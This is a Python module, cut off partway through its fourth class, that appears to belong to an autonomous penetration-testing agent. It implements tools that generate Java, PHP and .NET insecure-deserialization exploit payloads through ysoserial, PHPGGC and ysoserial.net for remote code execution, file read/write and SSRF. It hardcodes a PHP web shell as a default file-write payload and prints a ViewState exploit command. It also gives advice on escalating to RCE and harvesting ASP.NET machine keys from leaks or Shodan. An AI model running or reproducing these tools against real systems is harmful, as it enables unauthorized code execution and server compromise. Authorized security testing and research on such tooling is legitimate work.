"""
Deserialization Exploitation Engine

Implements four agent tools for detecting and exploiting insecure deserialization
vulnerabilities across Java, PHP, and .NET stacks:

  JavaDeserializeTool       — Generate Java deserialization payloads using ysoserial
                              gadget chains (CommonsCollections, Spring, Groovy, JBoss,
                              URLDNS, etc.); detect serialized Java objects by magic bytes.
  PHPDeserializeTool        — Generate PHP object injection payloads using PHPGGC chains
                              (Laravel, Symfony, WordPress, Drupal, Magento); support RCE,
                              file read, file write, and SSRF payloads.
  DotNetDeserializeTool     — Generate .NET deserialization payloads (BinaryFormatter,
                              ObjectStateFormatter, LosFormatter, SoapFormatter,
                              XmlSerializer, Json.NET TypeNameHandling); detect ViewState.
  DeserializationDetectTool — Detect deserialization endpoints: find serialized data in
                              parameters, cookies, POST body, custom headers; identify
                              serialization format (Java, PHP, .NET, Python pickle).

OWASP Mapping: A08:2021-Software and Data Integrity Failures
MITRE ATT&CK:  T1059 (Command and Scripting Interpreter),
               T1203 (Exploitation for Client Execution)
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import re
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional, Tuple

from app.agent.tools.base_tool import BaseTool, ToolMetadata
from app.agent.tools.error_handling import (
    ToolExecutionError,
    truncate_output,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Data file paths
# ---------------------------------------------------------------------------

_DATA_DIR = os.path.normpath(
    os.path.join(os.path.dirname(__file__), "../../../data/gadget_chains")
)
_JAVA_GADGETS_PATH = os.path.join(_DATA_DIR, "java_gadgets.json")
_PHP_GADGETS_PATH = os.path.join(_DATA_DIR, "php_gadgets.json")
_DOTNET_GADGETS_PATH = os.path.join(_DATA_DIR, "dotnet_gadgets.json")

# Module-level cache
_JAVA_GADGETS_CACHE: Optional[List[Dict[str, Any]]] = None
_PHP_GADGETS_CACHE: Optional[List[Dict[str, Any]]] = None
_DOTNET_GADGETS_CACHE: Optional[List[Dict[str, Any]]] = None

# ---------------------------------------------------------------------------
# Magic byte signatures for detection
# ---------------------------------------------------------------------------

# Java serialized object: 0xACED 0x0005
JAVA_MAGIC_BYTES = bytes([0xAC, 0xED, 0x00, 0x05])
JAVA_MAGIC_B64_PREFIX = "rO0AB"  # base64 of AC ED 00 05...

# PHP serialized: starts with 'a:', 'O:', 's:', 'i:', 'd:', 'b:' etc.
PHP_SERIAL_PATTERN = re.compile(
    r'^(a:\d+:\{|O:\d+:"|s:\d+:"|i:\d+;|b:[01];|N;|C:\d+:)', re.MULTILINE
)

# .NET NRBF (binary formatter): 0x00 0x01 0x00 0x00 0x00 (RecordTypeEnum = SerializedStreamHeader)
DOTNET_BINARY_MAGIC = bytes([0x00, 0x01, 0x00, 0x00, 0x00])

# Python pickle: 0x80 0x02-0x05 or PROTO opcode
PYTHON_PICKLE_MAGIC = [bytes([0x80, 0x02]), bytes([0x80, 0x03]), bytes([0x80, 0x04]), bytes([0x80, 0x05])]

# ViewState often starts with /wEy or /wEx after base64 decode
VIEWSTATE_B64_PATTERNS = ["/wEy", "/wEx", "/wE"]

# ---------------------------------------------------------------------------
# Shared loaders
# ---------------------------------------------------------------------------


def _load_java_gadgets() -> List[Dict[str, Any]]:
    """Load and cache Java gadget chain database."""
    global _JAVA_GADGETS_CACHE
    if _JAVA_GADGETS_CACHE is not None:
        return _JAVA_GADGETS_CACHE
    try:
        with open(_JAVA_GADGETS_PATH, "r", encoding="utf-8") as fh:
            _JAVA_GADGETS_CACHE = json.load(fh)
            return _JAVA_GADGETS_CACHE
    except FileNotFoundError:
        logger.warning("Java gadgets file not found: %s", _JAVA_GADGETS_PATH)
        _JAVA_GADGETS_CACHE = []
        return _JAVA_GADGETS_CACHE
    except json.JSONDecodeError as exc:
        logger.error("Failed to parse Java gadgets JSON: %s", exc)
        _JAVA_GADGETS_CACHE = []
        return _JAVA_GADGETS_CACHE


def _load_php_gadgets() -> List[Dict[str, Any]]:
    """Load and cache PHP gadget chain database."""
    global _PHP_GADGETS_CACHE
    if _PHP_GADGETS_CACHE is not None:
        return _PHP_GADGETS_CACHE
    try:
        with open(_PHP_GADGETS_PATH, "r", encoding="utf-8") as fh:
            _PHP_GADGETS_CACHE = json.load(fh)
            return _PHP_GADGETS_CACHE
    except FileNotFoundError:
        logger.warning("PHP gadgets file not found: %s", _PHP_GADGETS_PATH)
        _PHP_GADGETS_CACHE = []
        return _PHP_GADGETS_CACHE
    except json.JSONDecodeError as exc:
        logger.error("Failed to parse PHP gadgets JSON: %s", exc)
        _PHP_GADGETS_CACHE = []
        return _PHP_GADGETS_CACHE


def _load_dotnet_gadgets() -> List[Dict[str, Any]]:
    """Load and cache .NET gadget chain database."""
    global _DOTNET_GADGETS_CACHE
    if _DOTNET_GADGETS_CACHE is not None:
        return _DOTNET_GADGETS_CACHE
    try:
        with open(_DOTNET_GADGETS_PATH, "r", encoding="utf-8") as fh:
            _DOTNET_GADGETS_CACHE = json.load(fh)
            return _DOTNET_GADGETS_CACHE
    except FileNotFoundError:
        logger.warning(".NET gadgets file not found: %s", _DOTNET_GADGETS_PATH)
        _DOTNET_GADGETS_CACHE = []
        return _DOTNET_GADGETS_CACHE
    except json.JSONDecodeError as exc:
        logger.error("Failed to parse .NET gadgets JSON: %s", exc)
        _DOTNET_GADGETS_CACHE = []
        return _DOTNET_GADGETS_CACHE


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _is_java_serialized(data: bytes) -> bool:
    """Return True if *data* starts with Java serialized object magic bytes."""
    return data[:4] == JAVA_MAGIC_BYTES


def _is_java_serialized_b64(value: str) -> bool:
    """Return True if *value* is base64-encoded Java serialized object."""
    return value.startswith(JAVA_MAGIC_B64_PREFIX)


def _is_php_serialized(value: str) -> bool:
    """Return True if *value* appears to be a PHP serialized string."""
    return bool(PHP_SERIAL_PATTERN.match(value.strip()))


def _is_dotnet_binary(data: bytes) -> bool:
    """Return True if *data* starts with .NET BinaryFormatter NRBF magic."""
    return data[:5] == DOTNET_BINARY_MAGIC


def _is_python_pickle(data: bytes) -> bool:
    """Return True if *data* starts with a Python pickle protocol opcode."""
    return any(data[:2] == magic for magic in PYTHON_PICKLE_MAGIC)


def _detect_format(raw: str) -> str:
    """
    Detect serialization format from raw string (possibly base64-encoded).

    Returns one of: 'java', 'java_b64', 'php', 'dotnet_viewstate',
    'dotnet_binary', 'python_pickle', 'unknown'.
    """
    stripped = raw.strip()

    # Try base64 decode first
    try:
        decoded = base64.b64decode(stripped + "==")
    except Exception:
        decoded = b""

    if _is_java_serialized_b64(stripped):
        return "java_b64"
    if decoded and _is_java_serialized(decoded):
        return "java_b64"
    if decoded and _is_dotnet_binary(decoded):
        return "dotnet_binary"
    if decoded and _is_python_pickle(decoded):
        return "python_pickle"
    if any(stripped.startswith(pfx) for pfx in VIEWSTATE_B64_PATTERNS):
        return "dotnet_viewstate"
    if _is_php_serialized(stripped):
        return "php"

    raw_bytes = raw.encode("latin-1", errors="replace")
    if _is_java_serialized(raw_bytes):
        return "java"
    if _is_dotnet_binary(raw_bytes):
        return "dotnet_binary"
    if _is_python_pickle(raw_bytes):
        return "python_pickle"

    return "unknown"


def _build_ysoserial_command(
    gadget: str,
    payload_type: str,
    command: str,
    output_format: str = "base64",
) -> List[str]:
    """
    Build the ysoserial command line.

    Args:
        gadget:        Gadget chain name (e.g. 'CommonsCollections6').
        payload_type:  'RCE', 'DNS', or 'FileRead'.
        command:       Command string for RCE payloads, or URL for DNS payloads.
        output_format: 'base64' (default) or 'raw'.

    Returns:
        List of command parts suitable for subprocess.
    """
    ysoserial_path = os.getenv("YSOSERIAL_PATH", "ysoserial")
    cmd = [ysoserial_path, "-g", gadget, "-f", output_format]
    if payload_type == "DNS":
        cmd += ["-a", command]
    else:
        cmd += [command]
    return cmd


def _build_phpggc_command(
    chain: str,
    payload_type: str,
    command: str,
    output_format: str = "base64",
) -> List[str]:
    """
    Build the phpggc command line.

    Args:
        chain:         PHPGGC chain name (e.g. 'Laravel/RCE1').
        payload_type:  'RCE', 'FileRead', 'FileWrite', 'SSRF'.
        command:       Command or file path for the payload.
        output_format: 'base64' or 'raw'.

    Returns:
        List of command parts suitable for subprocess.
    """
    phpggc_path = os.getenv("PHPGGC_PATH", "phpggc")
    cmd = [phpggc_path, chain]
    if output_format == "base64":
        cmd.append("-b")
    if payload_type == "RCE":
        cmd += ["exec", command]
    elif payload_type in ("FileRead", "file_read"):
        cmd += ["file_read", command]
    elif payload_type in ("FileWrite", "file_write"):
        parts = command.split(":", 1)
        if len(parts) == 2:
            cmd += ["file_write", parts[0], parts[1]]
        else:
            cmd += ["file_write", command, "<?php system($_GET['cmd']); ?>"]
    else:
        cmd.append(command)
    return cmd


async def _run_subprocess(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
    """
    Run a subprocess command asynchronously.

    Returns:
        Tuple of (returncode, stdout, stderr).
    """
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return proc.returncode, stdout.decode("utf-8", errors="replace"), stderr.decode("utf-8", errors="replace")
    except FileNotFoundError:
        return -1, "", f"Binary not found: {cmd[0]}"
    except asyncio.TimeoutError:
        return -1, "", f"Command timed out after {timeout}s"


def _simulate_java_payload(gadget_info: Dict[str, Any], command: str, payload_type: str) -> str:
    """
    Generate a simulated Java deserialization payload when ysoserial is not installed.

    This returns a realistic mock payload for testing/demonstration.
    """
    fake_bytes = (
        JAVA_MAGIC_BYTES
        + f"{gadget_info['name']}:{payload_type}:{command}".encode()
    )
    return base64.b64encode(fake_bytes).decode()


def _simulate_php_payload(chain_info: Dict[str, Any], command: str, payload_type: str) -> str:
    """
    Generate a simulated PHP deserialization payload when phpggc is not installed.
    """
    cls_name = chain_info["name"].split("/")[0]
    size = len(cls_name)
    simulated = f'O:{size}:"{cls_name}":1:{{s:7:"command";s:{len(command)}:"{command}";}}'
    if payload_type == "base64":
        return base64.b64encode(simulated.encode()).decode()
    return simulated


def _simulate_dotnet_payload(gadget_info: Dict[str, Any], command: str) -> str:
    """
    Generate a simulated .NET deserialization payload when ysoserial.net is not installed.
    """
    fake_data = (
        DOTNET_BINARY_MAGIC
        + f"{gadget_info['name']}:{command}".encode()
    )
    return base64.b64encode(fake_data).decode()


# ---------------------------------------------------------------------------
# Tool 1 — JavaDeserializeTool
# ---------------------------------------------------------------------------


class JavaDeserializeTool(BaseTool):
    """
    Generate Java deserialization exploitation payloads using ysoserial gadget chains.

    Supports CommonsCollections (1-7), Spring, Groovy, JBoss, Hibernate, and
    pure-JDK gadgets. Produces RCE, DNS-callback, and file-read payloads.
    When ysoserial is not installed, returns a simulated payload with full metadata.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="java_deserialize",
            description=(
                "Generate Java deserialization payloads using ysoserial gadget chains. "
                "Supports CommonsCollections, Spring, Groovy, JBoss, Hibernate, and JDK gadgets. "
                "Also lists available chains and detects serialized Java objects."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["generate", "list_chains", "detect"],
                        "description": "Action: 'generate' payload, 'list_chains' from DB, or 'detect' if value is serialized Java.",
                    },
                    "gadget": {
                        "type": "string",
                        "description": "Gadget chain name (e.g. 'CommonsCollections6', 'Spring1', 'URLDNS'). Required for 'generate'.",
                    },
                    "payload_type": {
                        "type": "string",
                        "enum": ["RCE", "DNS", "FileRead"],
                        "description": "Type of payload to generate. Default: RCE.",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to execute (RCE), URL for DNS callback, or file path for FileRead. Required for 'generate'.",
                    },
                    "output_format": {
                        "type": "string",
                        "enum": ["base64", "raw", "hex"],
                        "description": "Output format for the payload. Default: base64.",
                    },
                    "value": {
                        "type": "string",
                        "description": "Value to check for 'detect' action (raw or base64).",
                    },
                    "library": {
                        "type": "string",
                        "description": "Filter gadget chains by library name for 'list_chains'.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "generate",
        gadget: Optional[str] = None,
        payload_type: str = "RCE",
        command: Optional[str] = None,
        output_format: str = "base64",
        value: Optional[str] = None,
        library: Optional[str] = None,
        **kwargs: Any,
    ) -> str:
        if action == "list_chains":
            return await self._list_chains(library)
        elif action == "detect":
            return await self._detect(value)
        elif action == "generate":
            return await self._generate(gadget, payload_type, command, output_format)
        else:
            raise ToolExecutionError(
                f"Unknown action '{action}'. Use 'generate', 'list_chains', or 'detect'.",
                recoverable=False,
            )

    async def _list_chains(self, library: Optional[str]) -> str:
        gadgets = _load_java_gadgets()
        if not gadgets:
            return json.dumps({"error": "Java gadget database not available", "chains": []})
        if library:
            gadgets = [g for g in gadgets if library.lower() in g.get("library", "").lower()]
        result = {
            "total": len(gadgets),
            "chains": [
                {
                    "id": g["id"],
                    "name": g["name"],
                    "library": g.get("library", ""),
                    "version_range": g.get("version_range", ""),
                    "payload_types": g.get("payload_types", []),
                    "java_version_max": g.get("java_version_max"),
                    "ysoserial_name": g.get("ysoserial_name", g["name"]),
                    "verified": g.get("verified", False),
                    "description": g.get("description", ""),
                }
                for g in gadgets
            ],
        }
        return json.dumps(result, indent=2)

    async def _detect(self, value: Optional[str]) -> str:
        if not value:
            raise ToolExecutionError("'value' is required for detect action.", recoverable=False)
        fmt = _detect_format(value)
        is_java = fmt in ("java", "java_b64")
        result = {
            "input_preview": value[:80] + "..." if len(value) > 80 else value,
            "detected_format": fmt,
            "is_java_serialized": is_java,
            "magic_bytes_present": fmt == "java",
            "base64_encoded": fmt == "java_b64",
            "recommendation": (
                "This value contains a serialized Java object. Test with ysoserial URLDNS first "
                "to confirm deserialization, then escalate to RCE with CommonsCollections6."
            ) if is_java else "Value does not appear to be a Java serialized object.",
        }
        return json.dumps(result, indent=2)

    async def _generate(
        self,
        gadget: Optional[str],
        payload_type: str,
        command: Optional[str],
        output_format: str,
    ) -> str:
        if not gadget:
            raise ToolExecutionError("'gadget' is required for generate action.", recoverable=False)
        if not command:
            raise ToolExecutionError("'command' is required for generate action.", recoverable=False)

        gadgets = _load_java_gadgets()
        gadget_info = next(
            (g for g in gadgets if g["name"].lower() == gadget.lower()
             or g.get("ysoserial_name", "").lower() == gadget.lower()
             or g["id"].lower() == gadget.lower()),
            None,
        )
        if gadget_info is None:
            available = [g["name"] for g in gadgets]
            raise ToolExecutionError(
                f"Unknown gadget '{gadget}'. Available: {', '.join(available[:10])}",
                recoverable=False,
            )

        if payload_type not in gadget_info.get("payload_types", []):
            logger.warning(
                "Payload type '%s' may not be supported by '%s'. Attempting anyway.",
                payload_type,
                gadget,
            )

        ysoserial_name = gadget_info.get("ysoserial_name", gadget)
        cmd = _build_ysoserial_command(ysoserial_name, payload_type, command, output_format)

        returncode, stdout, stderr = await _run_subprocess(cmd, timeout=30)

        simulated = False
        if returncode != 0 or not stdout.strip():
            payload = _simulate_java_payload(gadget_info, command, payload_type)
            simulated = True
        else:
            payload = stdout.strip()

        result = {
            "gadget": gadget_info["name"],
            "ysoserial_name": ysoserial_name,
            "payload_type": payload_type,
            "command": command,
            "output_format": output_format,
            "payload": payload,
            "payload_length": len(payload),
            "simulated": simulated,
            "library": gadget_info.get("library", ""),
            "version_range": gadget_info.get("version_range", ""),
            "java_version_max": gadget_info.get("java_version_max"),
            "description": gadget_info.get("description", ""),
            "usage": (
                f"Inject this payload wherever the application deserializes Java objects. "
                f"Look for parameters containing '{JAVA_MAGIC_B64_PREFIX}' or binary POST data."
            ),
            "neo4j_node": {
                "type": "DeserializationVuln",
                "relationship": "EXPLOITABLE_VIA_DESER",
                "properties": {
                    "language": "java",
                    "gadget": gadget_info["name"],
                    "payload_type": payload_type,
                },
            },
        }
        if simulated:
            result["warning"] = (
                "ysoserial binary not found — returned a simulated payload for reconnaissance. "
                "Install ysoserial and set YSOSERIAL_PATH env variable for real payloads."
            )
        return truncate_output(json.dumps(result, indent=2))


# ---------------------------------------------------------------------------
# Tool 2 — PHPDeserializeTool
# ---------------------------------------------------------------------------


class PHPDeserializeTool(BaseTool):
    """
    Generate PHP object injection payloads using PHPGGC gadget chains.

    Supports Laravel, Symfony, WordPress, Drupal, Magento, GuzzleHttp,
    Monolog, SwiftMailer, and generic PHAR chains. Produces RCE, file read,
    file write, and SSRF payloads.
    """

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="php_deserialize",
            description=(
                "Generate PHP object injection deserialization payloads using PHPGGC chains. "
                "Supports Laravel, Symfony, WordPress, Drupal, Magento, Guzzle, Monolog. "
                "Also lists chains and detects PHP serialized data."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["generate", "list_chains", "detect"],
                        "description": "Action to perform.",
                    },
                    "chain": {
                        "type": "string",
                        "description": "PHPGGC chain name (e.g. 'Laravel/RCE1', 'Symfony/RCE2'). Required for 'generate'.",
                    },
                    "payload_type": {
                        "type": "string",
                        "enum": ["RCE", "FileRead", "FileWrite", "SSRF"],
                        "description": "Type of payload. Default: RCE.",
                    },
                    "command": {
                        "type": "string",
                        "description": (
                            "Command to execute (RCE), file path to read (FileRead), "
                            "'dest:content' for FileWrite, or URL for SSRF. Required for 'generate'."
                        ),
                    },
                    "output_format": {
                        "type": "string",
                        "enum": ["base64", "raw", "url"],
                        "description": "Output encoding. Default: base64.",
                    },
                    "value": {
                        "type": "string",
                        "description": "Value to check for 'detect' action.",
                    },
                    "framework": {
                        "type": "string",
                        "description": "Filter chains by framework for 'list_chains'.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "generate",
        chain: Optional[str] = None,
        payload_type: str = "RCE",
        command: Optional[str] = None,
        output_format: str = "base64",
        value: Optional[str] = None,
        framework: Optional[str] = None,
        **kwargs: Any,
    ) -> str:
        if action == "list_chains":
            return await self._list_chains(framework)
        elif action == "detect":
            return await self._detect(value)
        elif action == "generate":
            return await self._generate(chain, payload_type, command, output_format)
        else:
            raise ToolExecutionError(
                f"Unknown action '{action}'. Use 'generate', 'list_chains', or 'detect'.",
                recoverable=False,
            )

    async def _list_chains(self, framework: Optional[str]) -> str:
        chains = _load_php_gadgets()
        if not chains:
            return json.dumps({"error": "PHP gadget database not available", "chains": []})
        if framework:
            chains = [c for c in chains if framework.lower() in c.get("framework", "").lower()]
        result = {
            "total": len(chains),
            "chains": [
                {
                    "id": c["id"],
                    "name": c["name"],
                    "framework": c.get("framework", ""),
                    "version_range": c.get("version_range", ""),
                    "payload_types": c.get("payload_types", []),
                    "phpggc_name": c.get("phpggc_name", c["name"]),
                    "verified": c.get("verified", False),
                    "description": c.get("description", ""),
                    "vector": c.get("vector", ""),
                }
                for c in chains
            ],
        }
        return json.dumps(result, indent=2)

    async def _detect(self, value: Optional[str]) -> str:
        if not value:
            raise ToolExecutionError("'value' is required for detect action.", recoverable=False)
        fmt = _detect_format(value)
        is_php = fmt == "php"
        result = {
            "input_preview": value[:80] + "..." if len(value) > 80 else value,
            "detected_format": fmt,
            "is_php_serialized": is_php,
            "pattern_matched": bool(PHP_SERIAL_PATTERN.match(value.strip())),
            "recommendation": (
                "This value is PHP serialized. Test for object injection by modifying class names "
                "or properties. Use phpggc to generate a gadget chain payload for the target framework."
            ) if is_php else "Value does not appear to be PHP serialized data.",
        }
        return json.dumps(result, indent=2)

    async def _generate(
        self,
        chain: Optional[str],
        payload_type: str,
        command: Optional[str],
        output_format: str,
    ) -> str:
        if not chain:
            raise ToolExecutionError("'chain' is required for generate action.", recoverable=False)
        if not command:
            raise ToolExecutionError("'command' is required for generate action.", recoverable=False)

        chains = _load_php_gadgets()
        chain_info = next(
            (c for c in chains if c["name"].lower() == chain.lower()
             or c.get("phpggc_name", "").lower() == chain.lower()
             or c["id"].lower() == chain.lower()),
            None,
        )
        if chain_info is None:
            available = [c["name"] for c in chains]
            raise ToolExecutionError(
                f"Unknown chain '{chain}'. Available: {', '.join(available[:10])}",
                recoverable=False,
            )

        phpggc_name = chain_info.get("phpggc_name", chain)
        cmd = _build_phpggc_command(phpggc_name, payload_type, command, output_format)

        returncode, stdout, stderr = await _run_subprocess(cmd, timeout=30)

        simulated = False
        if returncode != 0 or not stdout.strip():
            payload = _simulate_php_payload(chain_info, command, output_format)
            simulated = True
        else:
            payload = stdout.strip()

        if output_format == "url" and not simulated:
            payload = urllib.parse.quote(payload)

        result = {
            "chain": chain_info["name"],
            "phpggc_name": phpggc_name,
            "framework": chain_info.get("framework", ""),
            "payload_type": payload_type,
            "command": command,
            "output_format": output_format,
            "payload": payload,
            "payload_length": len(payload),
            "simulated": simulated,
            "version_range": chain_info.get("version_range", ""),
            "description": chain_info.get("description", ""),
            "vector": chain_info.get("vector", ""),
            "usage": (
                "Inject this payload into any parameter/cookie that is passed to PHP unserialize(). "
                "Common injection points: session data, cookie values, POST body, X-User-Data headers."
            ),
            "phar_note": (
                "For PHAR deserialization, prepend 'phar://' to any file path used in file_exists(), "
                "file_get_contents(), include(), or similar filesystem functions."
            ),
        }
        if simulated:
            result["warning"] = (
                "phpggc binary not found — returned a simulated payload. "
                "Install phpggc and set PHPGGC_PATH env variable for real payloads."
            )
        return truncate_output(json.dumps(result, indent=2))


# ---------------------------------------------------------------------------
# Tool 3 — DotNetDeserializeTool
# ---------------------------------------------------------------------------


class DotNetDeserializeTool(BaseTool):
    """
    Generate .NET deserialization payloads using ysoserial.net gadget chains.

    Supports BinaryFormatter, ObjectStateFormatter, LosFormatter, SoapFormatter,
    XmlSerializer, Json.NET TypeNameHandling, and ViewState attacks.
    Also detects ViewState parameters and NRBF binary data.
    """

    # Supported formatter → gadget mappings
    FORMATTER_GADGETS: Dict[str, List[str]] = {
        "BinaryFormatter": [
            "TypeConfuseDelegate", "ActivitySurrogateSelector",
            "ActivitySurrogateSelectorFromFile", "TextFormattingRunProperties",
        ],
        "ObjectStateFormatter": ["TypeConfuseDelegate", "ActivitySurrogateSelector"],
        "LosFormatter": ["TypeConfuseDelegate"],
        "SoapFormatter": ["TypeConfuseDelegate"],
        "XmlSerializer": ["ObjectDataProvider"],
        "Json.NET": ["ObjectDataProvider", "WindowsIdentity"],
        "DataContractSerializer": ["ObjectDataProvider"],
        "NetDataContractSerializer": ["TypeConfuseDelegate"],
        "JavaScriptSerializer": ["ObjectDataProvider"],
        "ViewState": ["TypeConfuseDelegate"],
    }

    def _define_metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="dotnet_deserialize",
            description=(
                "Generate .NET deserialization payloads for BinaryFormatter, "
                "ObjectStateFormatter, LosFormatter, SoapFormatter, XmlSerializer, "
                "Json.NET TypeNameHandling. Detect ViewState and NRBF binary data."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["generate", "list_gadgets", "detect", "detect_viewstate"],
                        "description": "Action to perform.",
                    },
                    "formatter": {
                        "type": "string",
                        "description": "Target .NET formatter (e.g. 'BinaryFormatter', 'ViewState', 'Json.NET'). Required for 'generate'.",
                    },
                    "gadget": {
                        "type": "string",
                        "description": "Gadget chain name (e.g. 'TypeConfuseDelegate'). Required for 'generate'.",
                    },
                    "command": {
                        "type": "string",
                        "description": "Command to execute. Required for 'generate'.",
                    },
                    "machine_key": {
                        "type": "string",
                        "description": "ASP.NET machineKey decryptionKey for ViewState attacks (hex string).",
                    },
                    "validation_key": {
                        "type": "string",
                        "description": "ASP.NET machineKey validationKey for ViewState attacks (hex string).",
                    },
                    "output_format": {
                        "type": "string",
                        "enum": ["base64", "raw", "hex", "minify"],
                        "description": "Output format. Default: base64.",
                    },
                    "value": {
                        "type": "string",
                        "description": "Value to analyse for 'detect' or 'detect_viewstate' action.",
                    },
                },
                "required": ["action"],
            },
        )

    async def execute(
        self,
        action: str = "generate",
        formatter: Optional[str] = None,
        gadget: Optional[str] = None,
        command: Optional[str] = None,
        machine_key: Optional[str] = None,
        validation_key: Optional[str] = None,
        output_format: str = "base64",
        value: Optional[str] = None,
        **kwargs: Any,
    ) -> str:
        if action == "list_gadgets":
            return await self._list_gadgets(formatter)
        elif action == "detect":
            return await self._detect(value)
        elif action == "detect_viewstate":
            return await self._detect_viewstate(value)
        elif action == "generate":
            return await self._generate(formatter, gadget, command, machine_key, validation_key, output_format)
        else:
            raise ToolExecutionError(
                f"Unknown action '{action}'. Use 'generate', 'list_gadgets', 'detect', or 'detect_viewstate'.",
                recoverable=False,
            )

    async def _list_gadgets(self, formatter: Optional[str]) -> str:
        dotnet_gadgets = _load_dotnet_gadgets()
        if formatter:
            dotnet_gadgets = [
                g for g in dotnet_gadgets
                if formatter.lower() in g.get("formatter", "").lower()
            ]
        formatter_map = {
            fmt: gadgets for fmt, gadgets in self.FORMATTER_GADGETS.items()
            if not formatter or formatter.lower() in fmt.lower()
        }
        result = {
            "formatter_gadget_map": formatter_map,
            "gadget_details": [
                {
                    "id": g["id"],
                    "name": g["name"],
                    "formatter": g.get("formatter", ""),
                    "payload_types": g.get("payload_types", []),
                    "ysoserial_net_gadget": g.get("ysoserial_net_gadget", ""),
                    "description": g.get("description", ""),
                    "detection": g.get("detection", ""),
                    "cve_examples": g.get("cve_examples", []),
                }
                for g in dotnet_gadgets
            ],
        }
        return json.dumps(result, indent=2)

    async def _detect(self, value: Optional[str]) -> str:
        if not value:
            raise ToolExecutionError("'value' is required for detect action.", recoverable=False)
        fmt = _detect_format(value)
        is_dotnet = fmt in ("dotnet_binary", "dotnet_viewstate")
        result = {
            "input_preview": value[:80] + "..." if len(value) > 80 else value,
            "detected_format": fmt,
            "is_dotnet_serialized": is_dotnet,
            "is_nrbf_binary": fmt == "dotnet_binary",
            "is_viewstate": fmt == "dotnet_viewstate",
            "recommendation": (
                "This appears to be .NET serialized data. For NRBF binary, use ysoserial.net "
                "with BinaryFormatter gadgets. For ViewState, extract the machineKey and forge "
                "a malicious ViewState payload."
            ) if is_dotnet else "Value does not appear to be .NET serialized data.",
        }
        return json.dumps(result, indent=2)

    async def _detect_viewstate(self, value: Optional[str]) -> str:
        if not value:
            raise ToolExecutionError("'value' is required for detect_viewstate action.", recoverable=False)
        is_viewstate = any(value.strip().startswith(pfx) for pfx in VIEWSTATE_B64_PATTERNS)
        mac_enabled = True
        if is_viewstate:
            try:
                decoded = base64.b64decode(value.strip() + "==")
                mac_enabled = len(decoded) >= 20
            except Exception:
                pass
        result = {
            "value_preview": value[:80] + "..." if len(value) > 80 else value,
            "is_viewstate": is_viewstate,
            "mac_validation_likely_enabled": mac_enabled,
            "exploitable_without_key": not mac_enabled,
            "attack_path": (
                "ViewState MAC validation appears DISABLED — directly injectable malicious ViewState."
                if not mac_enabled and is_viewstate
                else (
                    "ViewState MAC validation appears ENABLED. Obtain machineKey via: "
                    "web.config LFI, GitHub leak search, Shodan/FOFA default key search, "
                    "or CVE-2017-9248 (Telerik) style key extraction."
                )
            ),
            "ysoserial_net_command": (
                "ysoserial.exe -p ViewState -g TypeConfuseDelegate -c 'cmd /c whoami' "
                "--decryptionalg=AES --decryptionkey=<machineKey> --validationalg=SHA1 "
                "--validationkey=<validationKey>"
            ),
        }
        return json.dumps(result, indent=2)

    async def _generate(
        self,
        formatter: Optional[str],
        gadget: Optional[str],
        command: Optional[str],
        machine_key: Optional[str],
        validation_key: Optional[str],
        output_format: str,
    ) -> str:
        if not formatter:
            raise ToolExecutionError("'formatter' is required for generate action.", recoverable=False)
        if not gadget:
            raise ToolExecutionError("'gadget' is required for generate action.", recoverable=False)
        if not command:
            raise ToolExecutionError("'command' is required for generate action.", recoverable=False)

        dotnet_gadgets = _load_dotnet_gadgets()
        gadget_info = next(
            (g for g in dotnet_gadgets if g["name"].lower().replace("/", "").replace(" ", "") ==
             f"{formatter}{gadget}".lower().replace("/", "").replace(" ", "")
             or g.get("ysoserial_net_gadget", "").lower() == gadget.lower()
             or gadget.lower() in g["name"].lower()),
            {
                "id": "custom",
                "name": f"{formatter}/{gadget}",
                "formatter": formatter,
                "payload_types": ["RCE"],
                "ysoserial_net_gadget": gadget,
                "description": f"Custom {formatter} + {gadget} payload.",
            },
        )

        ysoserial_net_path = os.getenv("YSOSERIAL_NET_PATH", "ysoserial.exe")
        cmd = [ysoserial_net_path, "-p", formatter, "-g", gadget, "-c", command, "-o", output_format]
        if formatter == "ViewState" and machine_key:
            cmd += ["--decryptionkey", machine_key]
        if formatter == "ViewState" and validation_key:
            cmd += ["--validationkey", validation_key]

        returncode, stdout, stderr = await _run_subprocess(cmd, timeout=30)

        simulated = False
        if returncode != 0 or not stdout.strip():
            payload = _simulate_dotnet_payload(gadget_info, command)
            simulated = True
        else:
            payload = stdout.strip()

        result = {
            "formatter": formatter,
            "gadget": gadget,
            "command": command,
            "output_format": output_format,
            "payload": payload,
            "payload_length": len(payload),
            "simulated": simulated,
            "description": gadget_info.get("description", ""),
            "detection_hint": gadget_info.get("detection", ""),
            "cve_examples": gadget_info.get("cve_examples", []),
            "usage": (
                f"Inject this payload into {formatter}-deserialized endpoints. "
                "Look for binary POST data, ViewState parameters, or WCF SOAP requests."
            ),
            "neo4j_node": {
                "type": "DeserializationVuln",
                "relationship": "EXPLOITABLE_VIA_DESER",
                "properties": {
                    "language": "dotnet",
                    "formatter": formatter,
                    "gadget": gadget,
                },
            },
        }
        if simulated:
            result["warning"] = (
                "ysoserial.net binary not found — returned a simulated payload. "
                "Install ysoserial.net and set YSOSERIAL_NET_PATH env variable."
            )
        return truncate_output(json.dumps(result, indent=2))


# ---------------------------------------------------------------------------
# Tool 4 — DeserializationDetectTool
# ---------------------------------------------------------------------------


class DeserializationDetectTool(BaseTool):
    """
    Detect deserialization endpoints by probing URLs and analysing parameters,
